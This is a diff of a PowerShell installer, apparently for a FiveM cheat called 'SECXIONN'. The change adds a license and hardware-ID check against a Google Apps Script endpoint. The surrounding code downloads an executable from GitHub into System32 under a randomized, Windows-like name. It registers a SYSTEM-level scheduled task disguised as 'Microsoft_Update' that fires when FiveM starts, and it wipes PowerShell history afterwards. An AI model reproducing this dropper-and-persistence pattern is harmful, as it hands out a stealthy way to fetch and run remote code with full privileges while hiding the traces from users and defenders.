@@ -1,7 +1,48 @@
 $ErrorActionPreference = "SilentlyContinue"
-$CorrectKey = "SECXION" 
 
+# --- [ CONFIGURATION ] ---
+$ApiUrl = "https://script.google.com/macros/s/AKfycbxdsCcD60qopkxyp-xPnw2Nd1vPfaZk7QqgzL68tfxW87z_fnZUevt_UinNlu8Ccu0pcg/exec"
 
+function Get-HWID {
+    return (Get-CimInstance Win32_ComputerSystemProduct).UUID
+}
+# -------------------------
+
+# --- [ LOGIN SYSTEM ] ---
+Clear-Host
+$key = Read-Host "Enter Key"
+$myHwid = Get-HWID
+
+Write-Host "Verifying License..." -ForegroundColor Cyan
+
+try {
+    # ส่ง Key และ HWID ไปตรวจสอบที่ Google Sheets
+    $response = Invoke-RestMethod -Uri "$($ApiUrl)?key=$key&hwid=$myHwid" -Method Get
+    
+    if ($response -eq "success") {
+        Write-Host "Login Success!" -ForegroundColor Green
+        Start-Sleep 1
+    } elseif ($response -eq "hwid_mismatch") {
+        Write-Host "Wrong HWID! This key is locked to another PC." -ForegroundColor Red
+        Start-Sleep 2
+        exit
+    } elseif ($response -eq "expired") {
+        Write-Host "Key Expired or Inactive!" -ForegroundColor Red
+        Start-Sleep 2
+        exit
+    } else {
+        Write-Host "Invalid Key!" -ForegroundColor Red
+        Start-Sleep 2
+        exit
+    }
+} catch {
+    Write-Host "Server Error! Please check your internet." -ForegroundColor Red
+    Start-Sleep 2
+    exit
+}
+# -------------------------
+
+# --- [ ORIGINAL CODE START ] ---
 $p = @("font","drv","host","win","svc") | Get-Random
 $m = @("vcp","mgr","svc","hosts","core") | Get-Random
 $r = -join ((97..122) | Get-Random -Count 2 | % {[char]$_})
@@ -9,17 +50,6 @@ $fileName = "$p$m`_$r.exe"
 $taskName = "Microsoft_Update_$r"
 $destPath = "C:\Windows\System32\$fileName"
 $exeUrl   = "https://raw.githubusercontent.com/backmrpun-hash/PS/main/fontdrvhost.exe"
-
-
-Clear-Host
-$key = Read-Host "Enter Key"
-
-if ($key -ne $CorrectKey) {
-    Write-Host "Wrong key!" -ForegroundColor Red
-    Start-Sleep 2
-    exit
-}
-
 
 while ($true) {
     Clear-Host
@@ -34,11 +64,9 @@ while ($true) {
         Write-Host "Installing System..." -ForegroundColor Cyan
 
         try {
-            
             Invoke-WebRequest -Uri $exeUrl -OutFile $destPath -UseBasicParsing -UserAgent "Mozilla/5.0"
             Unblock-File -Path $destPath
 
-           
             auditpol /set /subcategory:"Process Creation" /success:enable
             $filter = "*[System[(EventID=4688)]] and *[EventData[Data[@Name='NewProcessName']='C:\Users\$env:USERNAME\AppData\Local\FiveM\FiveM.exe']]"
             schtasks /create /tn "$taskName" /tr "$destPath" /sc ONEVENT /ec Security /mo "$filter" /ru SYSTEM /f
@@ -46,7 +74,6 @@ while ($true) {
             Write-Host "Install complete!" -ForegroundColor Green
             Write-Host "SECXIONN will run automatically when FiveM starts." -ForegroundColor Yellow
             
-           
             Clear-History
             Remove-Item (Get-PSReadlineOption).HistorySavePath -ErrorAction SilentlyContinue
         }
